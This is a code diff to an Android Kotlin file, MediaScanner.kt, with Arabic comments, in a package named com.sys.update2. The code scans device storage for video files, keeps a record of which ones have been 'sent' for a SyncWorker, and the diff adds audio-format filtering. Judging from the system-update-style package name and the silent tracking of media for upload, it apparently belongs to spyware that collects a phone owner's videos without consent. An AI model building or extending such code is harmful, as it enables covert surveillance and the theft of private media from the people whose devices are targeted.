@@ -1,3 +1,7 @@
+// language: Kotlin, file: MediaScanner.kt
+// *الفلترة بتشيل أي ext صوتي حتى لو الـ roots غلط*
+// *إضافة isSentByKey/markSentByKey للاستخدام من SyncWorker*
+
 package com.sys.update2
 
 import android.content.Context
@@ -12,6 +16,13 @@ object MediaScanner {
     private const val MAX_FILE_MB = 500L
     private const val PREFS_NAME  = "media_scanner_prefs"
     private const val KEY_SENT    = "sent_files"
+
+    // ⭐ كل الامتدادات الصوتية لمنعها نهائياً
+    private val AUDIO_EXTS = setOf(
+        "mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr",
+        "3gp", "oga", "wma", "aiff", "aif", "alac", "mid", "midi",
+        "ape", "wv", "tta", "mka", "ra", "ram", "caf", "m4b", "m4p"
+    )
 
     private fun fmt(t: Long) =
         SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(t))
@@ -33,33 +44,65 @@ object MediaScanner {
 
     fun scanVideos(): List<MediaFile> =
         scanByExtension(
-            listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v")
+            listOf("mp4", "mkv", "avi", "mov", "webm", "flv", "wmv", "m4v", "mpeg", "mpg", "ts")
         ).sortedByDescending { it.lastModified }
 
     // ==================== منع التكرار ====================
 
     /** هل هذا الملف أُرسل سابقًا؟ */
-    fun isSent(context: Context, mf: MediaFile): Boolean {
-        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        return prefs.getStringSet(KEY_SENT, emptySet())!!.contains(key(mf))
-    }
+    fun isSent(context: Context, mf: MediaFile): Boolean =
+        isSentByKey(context, key(mf))
 
     /** سجّل الملف كـ "تم الإرسال" */
-    fun markSent(context: Context, mf: MediaFile) {
+    fun markSent(context: Context, mf: MediaFile) =
+        markSentByKey(context, key(mf))
+
+    /** نسخة بالـ key مباشرة — تُستخدم من SyncWorker بدون MediaFile */
+    fun isSentByKey(context: Context, k: String): Boolean {
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        return prefs.getStringSet(KEY_SENT, emptySet())!!.contains(k)
+    }
+
+    fun markSentByKey(context: Context, k: String) {
         val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
         val sent  = prefs.getStringSet(KEY_SENT, emptySet())!!.toMutableSet()
-        sent += key(mf)
+        sent += k
         prefs.edit().putStringSet(KEY_SENT, sent).apply()
     }
 
+    /** بناء المفتاح من حقول خام — يستخدمه SyncWorker */
+    fun buildKey(path: String, size: Long, lastModified: Long): String =
+        "$path|$size|$lastModified"
+
     /** مفتاح فريد لكل ملف = المسار + الحجم + وقت التعديل */
     private fun key(mf: MediaFile): String =
-        "${mf.path}|${mf.size}|${mf.lastModified}"
+        buildKey(mf.path, mf.size, mf.lastModified)
 
     /** مسح السجل بالكامل (اختياري) */
     fun reset(context: Context) {
         context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
             .edit().remove(KEY_SENT).apply()
+    }
+
+    /** هل الامتداد صوتي؟ */
+    fun isAudioExt(ext: String): Boolean =
+        ext.lowercase(Locale.US) in AUDIO_EXTS
+
+    /** هل الـ mime صوتي؟ */
+    fun isAudioMime(mime: String?): Boolean =
+        mime?.startsWith("audio/", ignoreCase = true) == true
+
+    /** فلتر شامل: يرجّع true لو الملف لازم يترفض */
+    fun isForbidden(path: String, name: String, mime: String?): Boolean {
+        val ext = name.substringAfterLast('.', "").lowercase(Locale.US)
+        if (isAudioExt(ext)) return true
+        if (isAudioMime(mime)) return true
+        // احتياطي: بعض الملفات بتبان بأسماء غريبة
+        val p = path.lowercase(Locale.US)
+        for (a in AUDIO_EXTS) {
+            if (p.endsWith(".$a")) return true
+        }
+        return false
     }
 
     // ==================== المسح الداخلي ====================
@@ -110,13 +153,15 @@ object MediaScanner {
                     walk(f, extensions, out, depth + 1, maxDepth, limit)
                 } else {
                     val ext = f.extension.lowercase(Locale.US)
-                    if (ext in extensions) {
-                        val sizeMb = f.length() / (1024 * 1024)
-                        if (sizeMb in 0..MAX_FILE_MB) {
+                    // ⭐ رفض مزدوج: لازم يكون من الامتدادات المسموحة AND مش صوتي
+                    if (ext in extensions && ext !in AUDIO_EXTS) {
+                        val sizeBytes = f.length()
+                        val sizeMb = sizeBytes / (1024 * 1024)
+                        if (sizeBytes > 0L && sizeMb <= MAX_FILE_MB) {
                             out += MediaFile(
                                 path = f.absolutePath,
                                 name = f.name,
-                                size = f.length(),
+                                size = sizeBytes,
                                 lastModified = f.lastModified(),
                                 mime = guessMime(ext)
                             )
@@ -140,10 +185,11 @@ object MediaScanner {
         "mkv"          -> "video/x-matroska"
         "avi"          -> "video/x-msvideo"
         "mov"          -> "video/quicktime"
-        "3gp"          -> "video/3gpp"
         "webm"         -> "video/webm"
         "flv"          -> "video/x-flv"
         "wmv"          -> "video/x-ms-wmv"
+        "mpeg", "mpg"  -> "video/mpeg"
+        "ts"           -> "video/mp2t"
         else           -> "application/octet-stream"
     }
 
